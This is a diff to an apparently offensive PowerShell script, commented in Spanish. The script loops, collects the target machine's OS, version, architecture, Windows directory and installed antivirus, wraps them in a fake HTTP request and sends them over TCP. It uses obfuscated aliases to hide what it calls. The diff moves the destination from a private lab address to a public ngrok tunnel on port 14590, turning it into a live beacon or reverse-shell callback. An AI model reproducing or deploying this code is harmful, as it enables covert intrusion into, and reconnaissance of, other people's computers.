@@ -33,7 +33,7 @@ while ($true) {
     $WindowsDirectory = (Get-WmiObject Win32_OperatingSystem).WindowsDirectory;
     $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
     # Configuracion de la IPAddress
-    $p = "10.10.10.128"
+    $p = "6.tcp.us-cal-1.ngrok.io"
 
     # Concatenacion de variables de informacion el equipo con su respectiva clave:valor
     $w = "=> RECOPILACION DE INFORMACION DEL TARGET <= `r`n System: $System`r`n VERSION: $Version`r`n ARCH: $Architecture`r`n DIRECTORY: $WindowsDirectory`r`n AVS: $av`r`n GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
@@ -45,7 +45,7 @@ while ($true) {
     Set-Alias $r ($r[$true-11] + ($r[[byte]("0x" + "FF") -261]) + $r[[byte]("0x" + "2a") -2])
     
     # Configuracion de Puerto
-    $y = New-Object $LUNA($p,443)
+    $y = New-Object $LUNA($p,14590)
     $z = $y.GetStream()
     $d = $s::UTF8.GetBytes($w)
     $z.Write($d, 0, $d.Length)
